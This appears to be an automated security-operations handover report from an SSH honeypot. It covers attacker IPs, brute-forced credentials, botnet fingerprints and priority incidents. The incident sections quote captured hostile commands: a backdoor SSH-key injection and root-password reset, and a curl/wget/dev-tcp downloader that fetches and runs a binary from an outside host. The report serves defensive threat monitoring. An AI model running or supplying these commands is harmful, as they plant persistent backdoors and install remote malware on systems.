# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-25 |
| **Generated At** | 2026-05-25T17:47:40Z |
| **Shift Time** | 17:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **85** |
| Confirmed Threats | **49** |
| False Positives Filtered | **36** (42.4%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **12** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **67** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **32** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **9** |
| Unique Passwords | **20** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `345gs5662d34` | 7 |
| `iptv` | 1 |
| `pablo` | 1 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 6 |
| `Aa@123456` | 2 |
| `1234` | 1 |
| `pablo` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `Aa@123456` | 2 |
| `iptv` | `1234` | 1 |
| `pablo` | `pablo` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Ff12345678` | `20.123.146.94` | 2026-05-25T15:44:51 |
| `root` | `3245gs5662d34` | `20.123.146.92` | 2026-05-25T15:44:54 |
| `root` | `jimmy` | `20.123.146.92` | 2026-05-25T15:49:15 |
| `root` | `3245gs5662d34` | `4.210.186.201` | 2026-05-25T15:49:18 |
| `root` | `abc.12345` | `20.123.146.92` | 2026-05-25T15:56:09 |
| `root` | `QAZwsx123!@#` | `4.210.186.201` | 2026-05-25T16:00:49 |
| `root` | `Aa@123456` | `47.242.66.123` | 2026-05-25T16:01:37 |
| `root` | `fjbdfdjkdsfs541544@@` | `4.210.186.201` | 2026-05-25T16:01:59 |
| `root` | `123321123321` | `67.205.134.251` | 2026-05-25T16:03:47 |
| `root` | `3245gs5662d34` | `67.205.134.251` | 2026-05-25T16:03:52 |
| `root` | `hw@123456` | `213.35.128.24` | 2026-05-25T17:00:13 |
| `root` | `3245gs5662d34` | `213.35.128.24` | 2026-05-25T17:00:20 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `186.10.86.130` | 2026-05-25T17:01:34 |
| `root` | `3245gs5662d34` | `186.10.86.130` | 2026-05-25T17:01:42 |
| `root` | `H6pW8Sk2rH` | `180.76.137.37` | 2026-05-25T17:43:46 |
| `root` | `dZBImRt6Cj` | `180.76.137.37` | 2026-05-25T17:44:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **85** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 41 |
| Unknown | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 28 | 7 |
| `af8223ac9914...` | libssh-based | 13 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 4 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 28 | 7 | Mirai/variant |
| `af8223ac9914...` | libssh | 13 | 1 | libssh-based |
| `1b8acd46a07d...` | Unknown | 4 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:GlZNUUsOvmCy"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `4.210.186.201`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.123.146.92`, `20.123.146.94`, `213.35.128.24`, `186.10.86.130`, `67.205.134.251`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **18** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS396982` | Google LLC | 2 | LOW |
| `AS1221` | Telstra Limited | 1 | LOW |
| `AS3249` | Telia Eesti AS | 1 | HIGH |
| `AS30722` | Fastweb SpA | 1 | LOW |
| `AS263102` | R A DIAS SANTOS PROVEDOR DE INTERNET | 1 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d4129cf532cb

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]94` |
| **First Seen** | 2026-05-25 15:44 |
| **Last Seen** | 2026-05-25 15:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:44:50` | `cowrie.session.connect` |
| `2026-05-25 15:44:50` | `cowrie.client.version` |
| `2026-05-25 15:44:50` | `cowrie.client.kex` |
| `2026-05-25 15:44:51` | `cowrie.login.success` |
| `2026-05-25 15:44:51` | `cowrie.session.params` |
| `2026-05-25 15:44:51` | `cowrie.command.input` |
| `2026-05-25 15:44:51` | `cowrie.command.failed` |
| `2026-05-25 15:44:51` | `cowrie.log.closed` |
| `2026-05-25 15:44:51` | `cowrie.session.params` |
| `2026-05-25 15:44:51` | `cowrie.command.input` |
| `2026-05-25 15:44:52` | `cowrie.session.file_download` |
| `2026-05-25 15:44:52` | `cowrie.log.closed` |
| `2026-05-25 15:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]94` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb737bacb86

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]92` |
| **First Seen** | 2026-05-25 15:44 |
| **Last Seen** | 2026-05-25 15:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:44:54` | `cowrie.session.connect` |
| `2026-05-25 15:44:54` | `cowrie.client.version` |
| `2026-05-25 15:44:54` | `cowrie.client.kex` |
| `2026-05-25 15:44:54` | `cowrie.login.success` |
| `2026-05-25 15:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]92` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33c95879ec19

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]92` |
| **First Seen** | 2026-05-25 15:49 |
| **Last Seen** | 2026-05-25 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:49:14` | `cowrie.session.connect` |
| `2026-05-25 15:49:14` | `cowrie.client.version` |
| `2026-05-25 15:49:14` | `cowrie.client.kex` |
| `2026-05-25 15:49:15` | `cowrie.login.success` |
| `2026-05-25 15:49:15` | `cowrie.session.params` |
| `2026-05-25 15:49:15` | `cowrie.command.input` |
| `2026-05-25 15:49:15` | `cowrie.command.failed` |
| `2026-05-25 15:49:15` | `cowrie.log.closed` |
| `2026-05-25 15:49:16` | `cowrie.session.params` |
| `2026-05-25 15:49:16` | `cowrie.command.input` |
| `2026-05-25 15:49:16` | `cowrie.session.file_download` |
| `2026-05-25 15:49:16` | `cowrie.log.closed` |
| `2026-05-25 15:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]92` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f48572803c

| Field | Detail |
|---|---|
| **Source IP** | `4.210.186[.]201` |
| **First Seen** | 2026-05-25 15:49 |
| **Last Seen** | 2026-05-25 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:49:18` | `cowrie.session.connect` |
| `2026-05-25 15:49:18` | `cowrie.client.version` |
| `2026-05-25 15:49:18` | `cowrie.client.kex` |
| `2026-05-25 15:49:18` | `cowrie.login.success` |
| `2026-05-25 15:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.210.186[.]201` to AbuseIPDB if not already reported
- [ ] Block `4.210.186[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238ae61db201

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]92` |
| **First Seen** | 2026-05-25 15:56 |
| **Last Seen** | 2026-05-25 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:56:09` | `cowrie.session.connect` |
| `2026-05-25 15:56:09` | `cowrie.client.version` |
| `2026-05-25 15:56:09` | `cowrie.client.kex` |
| `2026-05-25 15:56:09` | `cowrie.login.success` |
| `2026-05-25 15:56:10` | `cowrie.session.params` |
| `2026-05-25 15:56:10` | `cowrie.command.input` |
| `2026-05-25 15:56:10` | `cowrie.command.failed` |
| `2026-05-25 15:56:10` | `cowrie.log.closed` |
| `2026-05-25 15:56:10` | `cowrie.session.params` |
| `2026-05-25 15:56:10` | `cowrie.command.input` |
| `2026-05-25 15:56:10` | `cowrie.session.file_download` |
| `2026-05-25 15:56:10` | `cowrie.log.closed` |
| `2026-05-25 15:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.123.146[.]92` to AbuseIPDB if not already reported
- [ ] Block `20.123.146[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf07833d5ff

| Field | Detail |
|---|---|
| **Source IP** | `4.210.186[.]201` |
| **First Seen** | 2026-05-25 15:56 |
| **Last Seen** | 2026-05-25 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:56:12` | `cowrie.session.connect` |
| `2026-05-25 15:56:12` | `cowrie.client.version` |
| `2026-05-25 15:56:13` | `cowrie.client.kex` |
| `2026-05-25 15:56:13` | `cowrie.login.success` |
| `2026-05-25 15:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.210.186[.]201` to AbuseIPDB if not already reported
- [ ] Block `4.210.186[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-490dba892336

| Field | Detail |
|---|---|
| **Source IP** | `4.210.186[.]201` |
| **First Seen** | 2026-05-25 16:00 |
| **Last Seen** | 2026-05-25 16:01 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GlZNUUsOvmCy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 16:00:48` | `cowrie.session.connect` |
| `2026-05-25 16:00:48` | `cowrie.client.version` |
| `2026-05-25 16:00:48` | `cowrie.client.kex` |
| `2026-05-25 16:00:49` | `cowrie.login.success` |
| `2026-05-25 16:00:49` | `cowrie.session.params` |
| `2026-05-25 16:00:49` | `cowrie.command.input` |
| `2026-05-25 16:00:49` | `cowrie.command.failed` |
| `2026-05-25 16:00:49` | `cowrie.log.closed` |
| `2026-05-25 16:00:49` | `cowrie.session.params` |
| `2026-05-25 16:00:49` | `cowrie.command.input` |
| `2026-05-25 16:00:50` | `cowrie.session.file_download` |
| `2026-05-25 16:00:50` | `cowrie.log.closed` |
| `2026-05-25 16:01:00` | `cowrie.session.params` |
| `2026-05-25 16:01:00` | `cowrie.command.input` |
| `2026-05-25 16:01:00` | `cowrie.log.closed` |
| `2026-05-25 16:01:00` | `cowrie.session.params` |
| `2026-05-25 16:01:00` | `cowrie.command.input` |
| `2026-05-25 16:01:00` | `cowrie.log.closed` |
| `2026-05-25 16:01:01` | `cowrie.session.params` |
| `2026-05-25 16:01:01` | `cowrie.command.input` |
| `2026-05-25 16:01:01` | `cowrie.session.file_download` |
| `2026-05-25 16:01:01` | `cowrie.log.closed` |
| `2026-05-25 16:01:01` | `cowrie.session.params` |
| `2026-05-25 16:01:01` | `cowrie.command.input` |
| `2026-05-25 16:01:01` | `cowrie.log.closed` |
| `2026-05-25 16:01:02` | `cowrie.session.params` |
| `2026-05-25 16:01:02` | `cowrie.command.input` |
| `2026-05-25 16:01:02` | `cowrie.log.closed` |
| `2026-05-25 16:01:02` | `cowrie.session.params` |
| `2026-05-25 16:01:02` | `cowrie.command.input` |
| `2026-05-25 16:01:02` | `cowrie.command.input` |
| `2026-05-25 16:01:02` | `cowrie.log.closed` |
| `2026-05-25 16:01:03` | `cowrie.session.params` |
| `2026-05-25 16:01:03` | `cowrie.command.input` |
| `2026-05-25 16:01:03` | `cowrie.log.closed` |
| `2026-05-25 16:01:03` | `cowrie.session.params` |
| `2026-05-25 16:01:03` | `cowrie.command.input` |
| `2026-05-25 16:01:03` | `cowrie.log.closed` |
| `2026-05-25 16:01:04` | `cowrie.session.params` |
| `2026-05-25 16:01:04` | `cowrie.command.input` |
| `2026-05-25 16:01:04` | `cowrie.log.closed` |
| `2026-05-25 16:01:04` | `cowrie.session.params` |
| `2026-05-25 16:01:04` | `cowrie.command.input` |
| `2026-05-25 16:01:04` | `cowrie.log.closed` |
| `2026-05-25 16:01:04` | `cowrie.session.params` |
| `2026-05-25 16:01:04` | `cowrie.command.input` |
| `2026-05-25 16:01:05` | `cowrie.log.closed` |
| `2026-05-25 16:01:05` | `cowrie.session.params` |
| `2026-05-25 16:01:05` | `cowrie.command.input` |
| `2026-05-25 16:01:05` | `cowrie.log.closed` |
| `2026-05-25 16:01:05` | `cowrie.session.params` |
| `2026-05-25 16:01:05` | `cowrie.command.input` |
| `2026-05-25 16:01:06` | `cowrie.log.closed` |
| `2026-05-25 16:01:06` | `cowrie.session.params` |
| `2026-05-25 16:01:06` | `cowrie.command.input` |
| `2026-05-25 16:01:06` | `cowrie.log.closed` |
| `2026-05-25 16:01:06` | `cowrie.session.params` |
| `2026-05-25 16:01:06` | `cowrie.command.input` |
| `2026-05-25 16:01:07` | `cowrie.log.closed` |
| `2026-05-25 16:01:07` | `cowrie.session.params` |
| `2026-05-25 16:01:07` | `cowrie.command.input` |
| `2026-05-25 16:01:07` | `cowrie.log.closed` |
| `2026-05-25 16:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.210.186[.]201` to AbuseIPDB if not already reported
- [ ] Block `4.210.186[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b646db428103

| Field | Detail |
|---|---|
| **Source IP** | `47.242.66[.]123` |
| **First Seen** | 2026-05-25 16:01 |
| **Last Seen** | 2026-05-25 16:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://113.164.225[.]165:60120/arm_linux -o /tmp/jze8nISoKL; if [ ! -f /tmp/jze8nISoKL ]; then wget hxxp://113.164.225[.]165:60120/arm_linux -O /tmp/jze8nISoKL; fi; if [ ! -f /tmp/jze8nISoKL ]; then exec 6<>/dev/tcp/113.164.225[.]165/60120 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/jze8nISoKL ; chmod +x /tmp/jze8nISoKL && /tmp/jze8nISoKL BnNFb2r0e1cn8SppGio5KQJvKfA5Q3bodmpDfXZwZ19pcfZ0VTnxKW4UIjgmGm4u8SdSeeh1YkdjdnNlUWxz6HxWPe4uZhoiMyAOaSjxOlZu9HRhX2Z/aWJHYWr0fFMz9ihuByQgIgVsNvE/V2D0, head -c 2612960 > /tmp/qWo5ktkIm8, nohup $SHELL -c "curl hxxp://113.164.225[.]165:60120/arm_linux -o /tmp/jze8nISoKL; if [ ! -f /tmp/jze8nISoKL ]; then wget hxxp://113.164.225[.]165:60120/arm_linux -O /tmp/jze8nISoKL; fi; if [ ! -f /tmp/jze8nISoKL ]; then exec 6<>/dev/tcp/113.164.225[.]165/60120 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/jze8nISoKL ; chmod +x /tmp/jze8nISoKL && /tmp/jze8nISoKL BnNFb2r0e1cn8SppGio5KQJvKfA5Q3bodmpDfXZwZ19pcfZ0VTnxKW4UIjgmGm4u8SdSeeh1YkdjdnNlUWxz6HxWPe4uZhoiMyAOaSjxOlZu9HRhX2Z/aWJHYWr0fFMz9ihuByQgIgVsNvE/V2D0, (vLXXXELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 16:01:36` | `cowrie.session.connect` |
| `2026-05-25 16:01:36` | `cowrie.client.version` |
| `2026-05-25 16:01:36` | `cowrie.client.kex` |
| `2026-05-25 16:01:37` | `cowrie.login.success` |
| `2026-05-25 16:01:38` | `cowrie.session.params` |
| `2026-05-25 16:01:38` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.input` |
| `2026-05-25 16:01:42` | `cowrie.command.failed` |
| `2026-05-25 16:01:42` | `cowrie.command.failed` |
| `2026-05-25 16:01:42` | `cowrie.log.closed` |
| `2026-05-25 16:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.66[.]123` to AbuseIPDB if not already reported
- [ ] Block `47.242.66[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1c9c160eb87

| Field | Detail |
|---|---|
| **Source IP** | `47.242.66[.]123` |
| **First Seen** | 2026-05-25 16:01 |
| **Last Seen** | 2026-05-25 16:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://113.164.225[.]165:60120/arm_linux -o /tmp/ErWcA4wJdu; if [ ! -f /tmp/ErWcA4wJdu ]; then wget hxxp://113.164.225[.]165:60120/arm_linux -O /tmp/ErWcA4wJdu; fi; if [ ! -f /tmp/ErWcA4wJdu ]; then exec 6<>/dev/tcp/113.164.225[.]165/60120 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/ErWcA4wJdu ; chmod +x /tmp/ErWcA4wJdu && /tmp/ErWcA4wJdu BnNFb2r0e1cn8SppGio5KQJvKfA5Q3bodmpDfXZwZ19pcfZ0VTnxKW4UIjgmGm4u8SdSeeh1YkdjdnNlUWxz6HxWPe4uZhoiMyAOaSjxOlZu9HRhX2Z/aWJHYWr0fFMz9ihuByQgIgVsNvE/V2D0, head -c 2612960 > /tmp/LHAvOUexDa, nohup $SHELL -c "curl hxxp://113.164.225[.]165:60120/arm_linux -o /tmp/ErWcA4wJdu; if [ ! -f /tmp/ErWcA4wJdu ]; then wget hxxp://113.164.225[.]165:60120/arm_linux -O /tmp/ErWcA4wJdu; fi; if [ ! -f /tmp/ErWcA4wJdu ]; then exec 6<>/dev/tcp/113.164.225[.]165/60120 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/ErWcA4wJdu ; chmod +x /tmp/ErWcA4wJdu && /tmp/ErWcA4wJdu BnNFb2r0e1cn8SppGio5KQJvKfA5Q3bodmpDfXZwZ19pcfZ0VTnxKW4UIjgmGm4u8SdSeeh1YkdjdnNlUWxz6HxWPe4uZhoiMyAOaSjxOlZu9HRhX2Z/aWJHYWr0fFMz9ihuByQgIgVsNvE/V2D0, (vLXXXELF` |
